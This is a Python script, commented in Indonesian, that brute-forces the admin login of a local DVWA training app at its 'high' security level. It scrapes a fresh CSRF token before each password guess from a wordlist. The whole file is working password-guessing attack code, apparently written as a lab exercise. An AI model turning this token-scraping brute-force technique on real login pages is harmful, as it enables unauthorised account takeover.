
import requests
from bs4 import BeautifulSoup

# 1. Konfigurasi
target_url = "http://localhost/dvwa/vulnerabilities/brute/"
username = "admin"
filename = "password_list.txt"

user_cookies = {
    "PHPSESSID": "jo8dbv84erinvsemfp17kv4h73",
    "security": "high"
}

def get_token_and_validate(session, url):
    """
    Mengambil token CSRF sekaligus memvalidasi apakah session masih aktif.
    """
    # allow_redirects=False agar kita tahu jika dilempar ke login.php
    response = session.get(url, cookies=user_cookies, allow_redirects=False)
    
    if response.status_code == 302:
        return None # Indikasi session mati
    
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find('input', {'name': 'user_token'})
    
    if token_input:
        return token_input['value']
    return None

print(f"--- Memulai Brute Force HIGH (Target: {username}) ---")

# Gunakan Session object agar cookie dikelola secara konsisten
with requests.Session() as s:
    try:
        with open(filename, "r") as file:
            for line in file:
                password = line.strip()
                
                # Langkah 1: Ambil token baru & Cek Session
                token = get_token_and_validate(s, target_url)
                
                if token is None:
                    print("[ERROR] Session Expired atau Tidak Valid! Berhenti.")
                    break
                
                # Langkah 2: Kirim login dengan token CSRF
                params = {
                    'username': username,
                    'password': password,
                    'Login': 'Login',
                    'user_token': token 
                }
                
                # Jalankan request (di level High, login dikirim via GET sesuai URL target)
                response = s.get(target_url, params=params, cookies=user_cookies, allow_redirects=False)
                
                # Langkah 3: Analisis Respon dengan Positive Matching
                if "Welcome" in response.text:
                    print(f"[SUCCESS] Password ditemukan: {password}")
                    break
                elif "incorrect" in response.text:
                    print(f"[FAILED] Password: {password} | Token: {token[:8]}...")
                else:
                    # Jika tidak ada 'Welcome' dan tidak ada 'incorrect', mungkin session mati di tengah jalan
                    print("[!] Terjadi anomali pada respon server. Cek session.")
                    break

    except FileNotFoundError:
        print(f"Error: File {filename} tidak ditemukan!")
    except Exception as e:
        print(f"Terjadi kesalahan: {e}")

print("\nProses Selesai.")